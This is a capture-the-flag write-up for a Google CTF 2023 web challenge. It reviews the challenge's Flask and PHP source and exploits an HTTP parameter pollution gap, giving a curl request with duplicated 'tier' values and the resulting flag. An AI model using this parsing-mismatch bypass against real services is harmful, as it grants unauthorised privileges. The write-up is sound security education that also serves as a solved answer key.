# Google CTF 2023

## UNDER-CONSTRUCTION

> We were building a web app but the new CEO wants it remade in php.
>
>  Author: N/A
>
> [`attachment.zip`](attachment.zip)

Tags: _web_

## Solution
For this challenge two web services are available. The first service is a `Flask` service and offers `login` and `sign up` functionality. The second service is written in `PHP` and lets the user login. 

First inspecting the `Flask` service. It exposes three authrized endpoints `/login`, `/signup` and `/logout` and two unauthorized routes `/profile` and `/`. The unauthorized routes are not too exciting, root renders `index.html` and profile shows the current user info.

```html
{% extends "wrapper.html" %}

{% block content %}
<h1 class="title">
	Hello, {{ username }}!
</h1>
<p>Your tier is {{tier.name}}.</p>
{% endblock %}
```

SSTI is not obviously possible so moving on the the three other routes. `/login` and `/logout` are doing pretty much what the names suggest. `/signup` on the other hand looks promising.

```js
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    username = request.form.get('username')
    password = request.form.get('password')
    tier = models.Tier(request.form.get('tier'))

    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))

    if(len(username) > 15 or len(username) < 4):
        flash('Username length must be between 4 and 15')
        return redirect(url_for('authorized.signup'))

    user = models.User.query.filter_by(username=username).first()

    if user:
        flash('Username address already exists')
        return redirect(url_for('authorized.signup'))

    new_user = models.User(username=username, 
        password=generate_password_hash(password, method='sha256'), tier=tier.name)

    db.session.add(new_user)
    db.session.commit()

    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))
```

The user is created within the service. There is one check that forbits `GOLD tier` users to be created and then the user is synchronized to the `PHP` service by sending the raw request data to `/account_migrator.php`.

With those information, moving on to the PHP service. Index displays a login form and a response.

```php
function getResponse()
{
    if (!isset($_POST['username']) || !isset($_POST['password'])) {
        return NULL;
    }

    $username = $_POST['username'];
    $password = $_POST['password'];

    if (!is_string($username) || !is_string($password)) {
        return "Please provide username and password as string";
    }

    $tier = getUserTier($username, $password);

    if ($tier === NULL) {
        return "Invalid credentials";
    }

    $response = "Login successful. Welcome " . htmlspecialchars($username) . ".";

    if ($tier === "gold") {
        $response .= " " . getenv("FLAG");
    }

    return $response;
}
```

If username and password are set the user tier is queried from db. If the tier is `gold` the flag is displayed. Meaning we somehow need to create a `gold tier` user on PHP service side. `account_migrator.php` is provided for user creation. On the plus side, the code does not check for the tier other than if it's set and if it's a string. If both conditions are met the user is created with the tier given. The endpoint still can't be used without sending a valid token, which we don't have and can't leak easily. But the Flask service has the token and uses this endpoint to migrate new users to the PHP service. The only thing which stops us creating a `gold tier` user is the check in the `/signup` endpoint the Flask service does.

```php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
	http_response_code(400);
	exit();
}

if(!isset($_SERVER['HTTP_TOKEN'])) {
	http_response_code(401);
	exit();
}

if($_SERVER['HTTP_TOKEN'] !== getenv("MIGRATOR_TOKEN")) {
	http_response_code(401);
	exit();
}

if (!isset($_POST['username']) || !isset($_POST['password']) || !isset($_POST['tier'])) {
	http_response_code(400);
	exit();
}

if (!is_string($_POST['username']) || !is_string($_POST['password']) || !is_string($_POST['tier'])) {
	http_response_code(400);
	exit();
}

insertUser($_POST['username'], $_POST['password'], $_POST['tier']);


function insertUser($username, $password, $tier)
{
	$hash = password_hash($password, PASSWORD_BCRYPT);
	if($hash === false) {
		http_response_code(500);
		exit();
	}
	$host = getenv("DB_HOST");
	$dbname = getenv("MYSQL_DATABASE");
	$charset = "utf8";
	$port = "3306";

	$sql_username = "forge";
	$sql_password = getenv("MYSQL_PASSWORD");
	try {
		$pdo = new PDO(
			dsn: "mysql:host=$host;dbname=$dbname;charset=$charset;port=$port",
			username: $sql_username,
			password: $sql_password,
		);

		$pdo->exec("CREATE TABLE IF NOT EXISTS Users (username varchar(15) NOT NULL, password_hash varchar(60) NOT NULL, tier varchar(10) NOT NULL, PRIMARY KEY (username));");
		$stmt = $pdo->prepare("INSERT INTO Users Values(?,?,?);");
		$stmt->execute([$username, $hash, $tier]);
		echo "User inserted";
	} catch (PDOException $e) {
		throw new PDOException(
			message: $e->getMessage(),
			code: (int) $e->getCode()
		);
	}
}
```

To exploit this the attacker can send a query like `tier=blue&tier=gold` to the server which is interpreted differently by Flask and PHP. Flask will use the first occurence of the parameter in the list and PHP will use the last occurunce. Since the Flask service passes the unmodified request data on to the PHP service we can send a query like `username=fooo&password=bar&tier=blue&tier=gold` giving us a low privileged user on Flask side but a high privileged user for PHP.

```bash
curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -H "Content-Type: application/x-www-form-urlencoded" -d "username=fooo&password=bar&tier=blue&tier=gold"
```

Logging then in on PHP side with the new user gives the response including the flag.

```
Login successful. Welcome fooo. CTF{ff79e2741f21abd77dc48f17bab64c3d}
```

Flag `CTF{ff79e2741f21abd77dc48f17bab64c3d}`